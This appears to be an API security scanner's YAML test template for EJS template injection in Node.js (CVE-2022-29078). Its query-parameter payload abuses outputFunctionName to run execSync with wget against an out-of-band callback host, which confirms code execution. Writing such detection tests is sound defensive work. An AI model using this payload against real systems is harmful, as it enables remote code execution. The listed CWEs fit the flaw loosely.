id: NODEJS_TEMPLATE_INJECT
info:
  name: "Node.js Embedded JavaScript - Template Injection"
  description: "This vulnerability arises from insufficient validation or sanitization of user inputs in Node.js applications using Embedded JavaScript (EJS) templates. Attackers can exploit this flaw by injecting malicious data into template variables, which can then be executed as code within the application. This can lead to unauthorized access, data manipulation, or execution of arbitrary code, compromising the application's security and functionality. Proper input validation and escaping are essential to mitigate this risk."
  details:  "This vulnerability occurs when user inputs are improperly handled in EJS templates within Node.js applications. Attackers can inject malicious content into template variables, which, if not properly sanitized, can be executed as part of the template rendering process. This exploitation can lead to code execution, data leakage, or unauthorized manipulation of the application's behavior. Securing input handling and ensuring proper escaping of dynamic content are crucial for preventing this vulnerability."
  impact: "The impact of this vulnerability is significant, as it allows attackers to inject and execute malicious code within the application's EJS templates. This can result in unauthorized data access, manipulation, or full system compromise depending on the attacker's intent. The vulnerability jeopardizes the application's integrity and security, potentially exposing sensitive information or disrupting functionality. Immediate remediation is required to mitigate these risks."
  category:
    name: INJECT
    shortName: Injection Attacks
    displayName: Injection Attacks (INJECT)
  subCategory: NODEJS_TEMPLATE_INJECT
  severity: MEDIUM
  references:
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md"
  cwe:
    - CWE-200
    - CWE-16
  cve:
    - CVE-2022-29078
api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
  url:
    extract: urlVar
execute:
  type: single
  requests:
    - req:
      - modify_method: GET
      - send_ssrf_req:
          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
      - modify_url: "/page"
      - replace_body: '{}'
      - add_query_param:
          id: "abcdefgh"
      - add_query_param:
          !!str settings[view%20options][outputFunctionName]: "x;process.mainModule.require(%27child_process%27).execSync(%27wget+https://test-services.akto.io/store_uuid/${random_uuid}%27);s"
      
validate:
  response_code:
    eq: 200
  response_payload:
    contains_all:
      - "You are viewing page number"
    length:
      gt: 0
  ssrf_url_hit: ${random_uuid}